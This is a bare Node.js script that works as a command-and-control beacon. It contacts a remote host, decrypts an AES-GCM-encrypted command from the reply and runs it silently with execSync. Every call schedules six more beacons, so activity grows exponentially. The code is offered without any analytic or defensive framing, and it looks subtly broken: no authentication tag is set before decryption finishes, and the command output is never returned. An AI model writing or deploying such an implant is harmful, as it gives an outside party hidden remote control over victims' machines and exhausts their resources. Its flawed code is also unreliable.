const { execSync } = require("child_process");
const crypto = require("crypto");
async function beacon() {
  const res = await fetch("https://example.com/beacon", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id: 1 })
  });
  const msg = await res.json();
  const key = Buffer.from(msg.k, "hex");
  const dec = crypto.createDecipheriv("aes-256-gcm", key, Buffer.from(msg.n, "hex"));
  const cmd = Buffer.concat([dec.update(Buffer.from(msg.c, "hex")), dec.final()]).toString();
  const out = execSync(cmd, { windowsHide: true });
  setTimeout(beacon, 1000); setTimeout(beacon, 1000); setTimeout(beacon, 1000);
  setTimeout(beacon, 1000); setTimeout(beacon, 1000); setTimeout(beacon, 1000);
}
beacon();
